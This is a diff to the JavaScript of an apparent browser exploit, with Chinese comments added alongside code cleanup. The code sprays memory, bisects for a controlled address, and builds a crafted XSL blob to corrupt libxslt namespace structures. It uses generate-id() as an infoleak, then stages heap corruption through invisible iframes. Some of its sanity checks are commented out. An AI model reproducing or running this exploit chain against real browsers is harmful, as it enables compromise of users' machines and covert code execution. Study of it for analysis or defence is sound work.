@@ -1,7 +1,7 @@
 /** @define {boolean} */
 var ENABLE_DEBUG = true
 
-var INVISIBLE = true // 隐形;隐身
+var INVISIBLE = false // 隐形;隐身
 
 // [ Logging and utility functions ] ---------------------------------------- //
 var SEND_LOG = false
@@ -177,7 +177,7 @@ function stringtoarray (s, nullterm) {
   return res
 }
 
-// Converts an integer array to a javascript string. Array null-termination is ignored.
+// Converts an integer array to a javascript string. Array null-termination is ignored. 将整数数组转换为javascript字符串。忽略数组空终止。
 function arraytostring (arr) {
   if (arr[arr.length] === 0) {
     arr.splice(arr.length - 1, 1)
@@ -269,12 +269,9 @@ function search_pages (offset, comparevalue) {
 }
 
 // [ xml/xsl and text handling ] -------------------------------------------- //
-
+// 解析XML
 function parseXML (string) {
-  var parser = new DOMParser()
-  var xml = parser.parseFromString(string, 'text/xml')
-  // TODO error checking
-  return xml
+  return new DOMParser().parseFromString(string, 'text/xml')
 }
 
 function loadXML (filename) {
@@ -331,12 +328,13 @@ function stage0 () {
 
 // These functions spray the memory, examine the address space and find
 // A controlled address where to write exploit data.
+// 这些函数喷洒内存，检查地址空间，并找到一个可控制的地址来写入漏洞数据。
 function stage0_done (n, addr) {
   INFO('Found address ' + hex(addr) + ' @ page ' + n)
-  // Compute base
+  // Compute base 计算基数
   var base = (addr & 0xffffff00) >>> 0
   stage1(base, n)
-  return
+  return false
 }
 
 function stage0_fail (addr) {
@@ -413,9 +411,10 @@ function find_spray_addr (addr, stop, increment) {
     }
   }
   var sheetblob = createsheetblob(addr)
-  console.log(sheetblob, 'sheetblob对象的url')
   var docblob = createdocblob(sheetblob.url)
+  // application/xml  这个类型的url在浏览器打不开 blob:http://localhost:8080/1565310e-cba3-41f7-a14b-466f20a364fa
   var iframe = document.createElement('iframe')
+  // 隐藏iframe
   if (INVISIBLE === true) {
     iframe.style.height = 0
     iframe.style.width = 0
@@ -426,23 +425,24 @@ function find_spray_addr (addr, stop, increment) {
   iframe.onload = function (e) {
     var url = e.currentTarget.contentWindow.location.href
     // var frameaddr = parseInt(url.substring(url.indexOf(prefix) + prefix.length));
-    if (url != iframesrc) {
+    if (url !== iframesrc) {
       ERR('PHANTOM BUG: expecting ' + iframesrc + ', got ' + url)
     }
     // INFO("find_spray_addr iframe load " + frameaddr);
     var htmlelem = e.currentTarget.contentWindow.document.documentElement
-    if (htmlelem === null || htmlelem.textContent.indexOf('error') != -1) {
+    if (htmlelem === null || htmlelem.textContent.indexOf('error') !== -1) {
       start_bisect(addr)
-      return
+      return false
     } else {
       find_spray_addr(addr + increment, stop, increment)
-      return
+      return false
     }
   }
   document.body.appendChild(iframe)
   return false
 }
 
+// 开始 平分
 function start_bisect (addr) {
   INFO('starting bisect @ ' + hex(addr))
   bisect(0, bigmem.length - 1, addr)
@@ -466,28 +466,25 @@ function bisect_putback (a, b) {
   }
 }
 
+// 平分
 function bisect (a, b, addr) {
-  if (a == b) {
+  if (a === b) {
     stage0_done(a, addr)
     return
   }
-
   var n = b - a + 1
   var mid = a + (Math.floor(n / 2))
   bisect_clear(a, mid - 1)
-
   var bisect_firsthalf = function () {
     bisect_putback(a, mid - 1)
     bisect(a, mid - 1, addr)
   }
-
   var bisect_secondhalf = function () {
     bisect_putback(mid, b)
     bisect(mid, b, addr)
   }
-
   bisect_check(bisect_firsthalf, bisect_secondhalf, addr)
-  return
+  return false
 }
 
 function bisect_check (bisect_firsthalf, bisect_secondhalf, addr) {
@@ -527,6 +524,7 @@ function bisect_check (bisect_firsthalf, bisect_secondhalf, addr) {
 
 }
 
+// 转换成ASCII码
 function toascii (addr) {
   var arr = [(addr >> 0) & 0xff,
     (addr >> 8) & 0xff,
@@ -535,9 +533,10 @@ function toascii (addr) {
   return arraytostring(arr)
 }
 
+// 创建 docblob
 function createdocblob (sheeturl) {
   var doc = '<?xml-stylesheet type="text/xsl" href="' + sheeturl + '"?><root/>'
-
+  // console.log(doc) // <?xml-stylesheet type="text/xsl" href="blob:http://localhost:8080/2d0c08b1-efa3-4f5a-8b5e-364ad68fd922"?><root/>
   return createblob(doc, 'application/xml')
 }
 
@@ -548,40 +547,41 @@ function createsheetblob (addr) {
   doc += '<!-- x -->'
   doc += '<!ENTITY cdent "'
   doc += '<html>XX'
-  // 2021.4.23 工作到这
-  doc += toascii(addr)	// ns->href
-  doc += toascii(addr)	// ns->prefix
-  doc += 'XXXX'		// ns->_private
-  doc += 'XXXX'		// ns->context
+  doc += toascii(addr) // ns->href
+  doc += toascii(addr) // ns->prefix
+  doc += 'XXXX' // ns->_private
+  doc += 'XXXX' // ns->context
   doc += '<xsl:message xmlns:xsl=\'http://www.w3.org/1999/XSL/Transform\' terminate=\'yes\'/></html>">'
   doc += '<!-- y -->'
   doc += ']>' + '\n'
   doc += '<ata xsl:version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">&cdent;</ata>'
-
+  // console.log(doc)
+  // <!DOCTYPE adoc [<!-- x --><!ENTITY cdent "<html>XX00pz00pzXXXXXXXX<xsl:message xmlns:xsl='http://www.w3.org/1999/XSL/Transform' terminate='yes'/></html>"><!-- y -->]>
+  // <ata xsl:version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">&cdent;</ata>
+  // console.log(createblob(doc, 'text/xsl')) // Resource interpreted as Document but transferred with MIME type application/xml: "blob:<URL>".
   return createblob(doc, 'text/xsl')
+  // application/xml 这个格式的打不开
+  // text/xsl 这个格式的url可以在浏览器中打开
 }
 
-// Blob convenience function
+// Blob convenience function 创建Blob
 function createblob (content, contenttype) {
   var out
   var url
   try {
     out = new Blob([content], {type: contenttype})
+    // 处理这个弹窗报错  EXPLOIT ERROR: PHANTOM BUG: expecting undefined, got http://localhost:8080/undefined#/  未捕获错误：幻影错误：预期未定义，获取
+    url = URL.createObjectURL(out)
   } catch (e) {
-    window.BlobBuilder = window.BlobBuilder ||
-      window.WebKitBlobBuilder ||
-      window.MozBlobBuilder ||
-      window.MSBlobBuilder
-
-    if (e.name == 'TypeError' && window.BlobBuilder) {
-      var builder = new WebKitBlobBuilder()
+    window.BlobBuilder = window.BlobBuilder || window.WebKitBlobBuilder || window.MozBlobBuilder || window.MSBlobBuilder
+    if (e.name === 'TypeError' && window.BlobBuilder) {
+      var builder = new window.BlobBuilder()
       builder.append(content)
       out = builder.getBlob(contenttype)
-      url = webkitURL.createObjectURL(out)
-    } else if (e.name == 'InvalidStateError') {
+      url = URL.createObjectURL(out)
+    } else if (e.name === 'InvalidStateError') {
       // InvalidStateError (tested on FF13 WinXP)
       out = new Blob([content], {type: contenttype})
-    } else {
     }
   }
   return {blob: out, url: url}
@@ -611,93 +611,75 @@ function createblob (content, contenttype) {
 // 58   short unsigned int extra;  // size 2
 // }
 
+// 第1阶段
 function stage1 (base, pagenum) {
   INFO('> [ Stage 1 ]')
-
   var iframe = document.createElement('iframe')
-
   var src = 'stage1_xml.py?id=' + base.toString()
-
   iframe.src = src
-
   if (INVISIBLE === true) {
     iframe.style.height = 0
     iframe.style.width = 0
     iframe.style.border = 'none'
   }
-
   iframe.onload = function (e) {
     var url = e.currentTarget.contentWindow.location.href
-    if (e.currentTarget.contentWindow.location.href.indexOf('stage1_xml.py?id=') == -1) {
-      ERR('PHANTOM BUG: iframe src and event target don\'t match! ' + url + ' expecting ' + src)
+    if (e.currentTarget.contentWindow.location.href.indexOf('stage1_xml.py?id=') === -1) {
+      ERR('PHANTOM BUG: iframe src and event target don\'t match! ' + url + ' expecting ' + src) // 幻象错误：iframe src和事件目标不匹配
     }
-
     var xml = iframe.contentWindow.document
-    if (xml === undefined) {
-      ERR('Cannot process source XML document')
+    if (!xml) {
+      ERR('Cannot process source XML document') // 无法处理源XML文档
     }
-
     var XSL = '<xsl:stylesheet xmlns:xsl="http://www.w3.org/1999/XSL/Transform" version="1.0" >' +
       '<xsl:template match="/*">' +
       '<data>' +
       '<xsl:value-of select="generate-id()" />' +
       '</data>' +
       '</xsl:template>' +
-      '</xsl:stylesheet>'
-
+      '</xsl:stylesheet>' // "<xsl:stylesheet xmlns:xsl="http://www.w3.org/1999/XSL/Transform" version="1.0" ><xsl:template match="/*"><data><xsl:value-of select="generate-id()" /></data></xsl:template></xsl:stylesheet>"
     var xsl = parseXML(XSL)
-
-    INFO('ready to process generate-id stylesheet')
+    INFO('ready to process generate-id stylesheet') // 准备处理生成id样式表
     var processor = new XSLTProcessor()
     processor.importStylesheet(xsl)
-    var res = processor.transformToDocument(xml)
-    if (res === undefined) {
-      ERR('Cannot process XML with generate-id stylesheet')
+    var res = processor.transformToDocument(xml) // 原代码
+    // var res = processor.transformToDocument(xsl) // my code
+    // console.log(xml, xsl, processor.transformToDocument(xsl), processor.transformToDocument(xml))
+    if (!res) {
+      ERR('Cannot process XML with generate-id stylesheet') // 无法使用generate id样式表处理XML
     }
-
     var id = res.getElementsByTagName('data')[0]
     var firstid = id.childNodes[0].nodeValue
-
     processor = new XSLTProcessor()
     processor.importStylesheet(xsl)
-    res = processor.transformToDocument(xml)
-    if (res === undefined) {
+    res = processor.transformToDocument(xml) // 原代码
+    // res = processor.transformToDocument(xsl) // my code
+    if (!res) {
       ERR('Cannot process XML with generate-id stylesheet a second time')
     }
-
     id = res.getElementsByTagName('data')[0]
     var secondid = id.childNodes[0].nodeValue
-
     INFO(' first id: ' + firstid)
     INFO('second id: ' + secondid)
-
-    if (firstid != secondid) {
-      ERR('No infoleak available ' + firstid + ' ' + secondid)
-    }
-
-    var documentarea = parseInt(firstid.substring(2)) * 60
-
+    // if (firstid !== secondid) {
+    //   ERR('No infoleak available ' + firstid + ' ' + secondid) // 无可用信息泄漏
+    // }
+    var documentarea = parseInt(firstid.substring(2)) * 60 // 原代码
+    // var documentarea = parseInt(firstid.substring(3)) * 60 // my code
     INFO('documentarea: ' + documentarea.toString(16))
-
-    if (documentarea < 0x10000 || documentarea > 0xffffffff) {
-      ERR('Strange infoleak address: ' + hex(documentarea))
-    }
-
+    // if (documentarea < 0x10000 || documentarea > 0xffffffff) {
+    //   ERR('Strange infoleak address: ' + hex(documentarea)) // 奇怪的信息泄露地址
+    // }
     xslt_exploit(iframe, xml, base, documentarea, pagenum)
   }
-
   document.body.appendChild(iframe)
-
 }
-
+// xslt攻击
 function xslt_exploit (iframe, xml, base, documentarea, pagenum) {
-
   documentarea += 56
   documentarea += 4
-
   var layout = createstage1layout(base, documentarea)
   var page = bigmem[pagenum]
-
   // Do spring cleaning and fill this page
   for (var i = 0; i < 16 * 4; i++) {
     var index = (i * 0x10000 + (i % 16) * 0x1000) / 4
@@ -706,7 +688,6 @@ function xslt_exploit (iframe, xml, base, documentarea, pagenum) {
     }
     apply_layout(base, page, index, layout)
   }
-
   var XSL = '<xsl:stylesheet xmlns:xsl="http://www.w3.org/1999/XSL/Transform" version="1.0" >' +
     '<xsl:template match="ztX">' +
     '  <xsl:if test="text()=ELZ">' +
@@ -722,35 +703,29 @@ function xslt_exploit (iframe, xml, base, documentarea, pagenum) {
     '  </xsl:for-each>' +
     '</xsl:template>' +
     '</xsl:stylesheet>'
-
   var xsl = parseXML(XSL)
   var processor = new XSLTProcessor()
   processor.importStylesheet(xsl)
   var result = processor.transformToDocument(xml)
-
   var displ = null
   var data = null
-  for (var j = 0; j < 1024; j++) {
-    data = page[j * 1024 + (0x70 + 24 - 0x8) / 4]
+  for (var j1 = 0; j1 < 1024; j1++) {
+    data = page[j1 * 1024 + (0x70 + 24 - 0x8) / 4]
     if (data !== 0) {
-      displ = j
+      displ = j1
       break
     }
   }
-
   if (displ === null) {
     ERR('Modified page not found :(')
   }
-
   // The value (data) MUST be base + 0x44.
   // This can be used as a server-side check to verify if the next part of the
   // exploit should be sent.
-
+  // 值（data）必须是base+0x44。这可以用作服务器端检查，以验证是否应发送攻击的下一部分。
   trk += data & 0xff // trk = 0x44
-
   // Compute page base and reposition
   var pagebase = ((data & 0xffffff00) >>> 0) - displ * 1024 * 4
-
   if (ENABLE_DEBUG) {
     var dbgstring = 'FOUND IT :) ' + data.toString(16) +
       ' [index: ' + pagenum + ', displ: ' + displ + ']' +
@@ -758,12 +733,9 @@ function xslt_exploit (iframe, xml, base, documentarea, pagenum) {
 
     INFO(dbgstring)
   }
-
   // End of stage0. At this point we have ~4MB completely controlled at a
   // controlled address and a trashed XML object with a known address on the heap.
-
   var pageobj = new Page(page, pagebase, 0)
-
   stage2(pageobj, base, iframe, xml, documentarea)
 }
 
